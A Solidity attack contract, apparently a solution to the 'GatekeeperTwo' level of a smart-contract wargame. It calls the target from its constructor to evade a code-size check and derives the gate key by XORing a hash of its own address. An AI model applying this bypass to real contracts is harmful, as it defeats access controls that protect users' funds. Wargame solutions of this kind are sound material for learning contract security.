// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {

    GatekeeperTwo victim;

    constructor(address _v) {
        victim = GatekeeperTwo(_v);
        uint64 key = (uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        key = key ^ 0xffffffffffffffff;
        victim.enter(bytes8(key));
    }

}